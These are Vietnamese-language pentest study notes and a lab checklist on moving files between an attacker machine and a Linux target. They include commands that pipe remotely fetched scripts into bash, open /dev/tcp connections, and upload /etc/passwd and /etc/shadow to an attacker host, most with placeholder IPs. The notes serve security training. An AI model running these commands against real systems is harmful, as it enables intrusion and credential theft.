# Linux File Transfer Methods

## Mục tiêu

Trong pentest Linux, ta thường cần chuyển file giữa Pwnbox/attacker và target.

Có 2 hướng chính:

- Download: attacker/Pwnbox -> target
- Upload: target -> attacker/Pwnbox

Dùng để:

- Đưa tool enumeration vào target: `LinEnum.sh`, `pspy`, `chisel`, `socat`
- Lấy file từ target về attacker: config, proof, log, pcap, output
- Transfer trong môi trường bị hạn chế tool/network

## Ý chính

Linux có nhiều cách file transfer:

- Base64 encode/decode
- wget
- curl
- Fileless execution qua pipe
- Bash `/dev/tcp`
- SSH/SCP
- Python/PHP/Ruby mini web server
- uploadserver

HTTP/HTTPS thường được dùng nhiều vì outbound web traffic hay được cho phép.

## Base64 Transfer

Dùng khi không transfer qua network được hoặc chỉ copy-paste được text.

Check hash trước:

```bash
md5sum id_rsa
```
Encode trên Pwnbox:

```
cat id_rsa | base64 -w 0; echo
```

Decode trên target:

```
echo -n '<BASE64>' | base64 -d > id_rsa
```

Check hash sau:

```
md5sum id_rsa
```

Nếu hash giống nhau thì file transfer thành công.

## Web Download với wget/curl

Download bằng wget:

```
wget http://ATTACKER_IP:8000/LinEnum.sh -O /tmp/LinEnum.sh
```

Download bằng curl:

```
curl -o /tmp/LinEnum.sh http://ATTACKER_IP:8000/LinEnum.sh
```

Ghi nhớ:

- `wget`: dùng `-O`
- `curl`: dùng `-o`

## Fileless Execution

Chạy script trực tiếp, không lưu xuống disk:

```
curl http://ATTACKER_IP:8000/LinEnum.sh | bash
```

```
wget -qO- http://ATTACKER_IP:8000/script.py | python3
```

Lưu ý: một số payload vẫn có thể tạo file tạm trên disk.

## Download bằng Bash /dev/tcp

Dùng khi không có wget/curl/nc.

Mở kết nối TCP:

```
exec 3<>/dev/tcp/10.10.10.32/80
```

Gửi HTTP request:

```
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

Đọc response:

```
cat <&3
```

## SSH/SCP Download

Bật SSH server trên Pwnbox:

```
sudo systemctl enable ssh
sudo systemctl start ssh
netstat -lnpt
```

Download file từ remote về máy hiện tại:

```
scp user@REMOTE_IP:/path/file .
```

Ví dụ:

```
scp plaintext@192.168.49.128:/root/myroot.txt .
```

## Web Upload bằng uploadserver

Cài uploadserver:

```
sudo python3 -m pip install --user uploadserver
```

Tạo self-signed certificate:

```
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

Tạo thư mục web và chạy HTTPS upload server:

```
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

Upload từ target:

```
curl -X POST https://ATTACKER_IP/upload -F 'files=@/path/file' --insecure
```

Upload nhiều file:

```
curl -X POST https://ATTACKER_IP/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

## Mini Web Server

Python3:

```
python3 -m http.server 8000
```

Python2:

```
python2.7 -m SimpleHTTPServer 8000
```

PHP:

```
php -S 0.0.0.0:8000
```

Ruby:

```
ruby -run -ehttpd . -p8000
```

Download từ Pwnbox:

```
wget http://TARGET_IP:8000/filetotransfer.txt
```

## SCP Upload

Upload file lên remote qua SSH:

```
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

## Ghi nhớ

- HTTP/HTTPS là lựa chọn phổ biến nhất.
- Nếu có `wget`/`curl`, ưu tiên dùng chúng.
- Nếu không có tool, thử Bash `/dev/tcp`.
- Nếu chỉ copy-paste được text, dùng Base64.
- Nếu có SSH, dùng SCP.
- Nếu cần target upload file về Pwnbox, dùng `uploadserver` hoặc dựng web server trên target rồi tải từ Pwnbox.
- Sau khi transfer file quan trọng, check hash.

---
# Linux File Transfer Lab Checklist  
  
## 1. Xác định hướng transfer  
  
- [ ] Mình cần đưa file từ Pwnbox vào target?  
- Direction: Pwnbox -> Target  
- [ ] Hay cần lấy file từ target về Pwnbox?  
- Direction: Target -> Pwnbox  
- [ ] Shell hiện tại là gì?  
- [ ] SSH shell  
- [ ] Reverse shell  
- [ ] Web shell  
- [ ] Command injection  
- [ ] Kiểm tra tool có sẵn trên target:  
  
```bash  
which wget curl python3 python python2 php ruby nc bash scp
```
## 2. Download từ Pwnbox về target bằng HTTP

Trên Pwnbox:

```
cd /path/to/files
python3 -m http.server 8000
```

Trên target:

```
wget http://PWNBOX_IP:8000/file -O /tmp/file
```

Hoặc:

```
curl -o /tmp/file http://PWNBOX_IP:8000/file
```

Kiểm tra:

```
ls -l /tmp/file
file /tmp/file
md5sum /tmp/file
```

## 3. Fileless execution

Dùng khi muốn chạy script ngay:

```
curl http://PWNBOX_IP:8000/script.sh | bash
```

Hoặc:

```
wget -qO- http://PWNBOX_IP:8000/script.py | python3
```

Cẩn thận: chỉ chạy script mình tin tưởng và trong lab được phép.

## 4. Transfer bằng Base64

Trên Pwnbox:

```
md5sum file
cat file | base64 -w 0; echo
```

Copy chuỗi Base64.

Trên target:

```
echo -n '<BASE64>' | base64 -d > file
md5sum file
```

So sánh hash.

## 5. Download bằng Bash /dev/tcp

Dùng khi không có wget/curl:

```
exec 3<>/dev/tcp/PWNBOX_IP/80
echo -e "GET /file HTTP/1.1\nHost: PWNBOX_IP\n\n">&3
cat <&3
```

Nếu cần lưu file, phải xử lý header HTTP hoặc dùng cách khác nếu có thể.

## 6. Upload từ target về Pwnbox bằng uploadserver

Trên Pwnbox:

```
python3 -m pip install --user uploadserver
python3 -m uploadserver 8000
```

Trên target:

```
curl -X POST http://PWNBOX_IP:8000/upload -F 'files=@/path/to/file'
```

Kiểm tra file đã về Pwnbox chưa.

## 7. Upload qua HTTPS uploadserver

Trên Pwnbox:

```
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

Trên target:

```
curl -X POST https://PWNBOX_IP/upload -F 'files=@/path/to/file' --insecure
```

## 8. SCP download/upload

Kiểm tra SSH server:

```
sudo systemctl start ssh
netstat -lnpt | grep ':22'
```

Download từ remote về local:

```
scp user@REMOTE_IP:/path/file .
```

Upload local lên remote:

```
scp file user@REMOTE_IP:/tmp/
```

## 9. Dựng mini web server trên target

Nếu target có file cần lấy và có Python/PHP/Ruby:

```
cd /path/contains/file
python3 -m http.server 8000
```

Trên Pwnbox:

```
wget http://TARGET_IP:8000/file
```

## 10. Khi lỗi

- [ ]  Kiểm tra IP Pwnbox đúng chưa:

```
ip a
```

- [ ]  Kiểm tra server có chạy chưa.
- [ ]  Kiểm tra port có bị firewall chặn không.
- [ ]  Thử đổi port: `8000`, `8080`, `80`, `443`.
- [ ]  Kiểm tra target có outbound connection không.
- [ ]  Thử cả `wget` và `curl`.
- [ ]  Nếu không có tool, thử Base64 hoặc `/dev/tcp`.
- [ ]  Sau khi transfer, check hash bằng `md5sum`.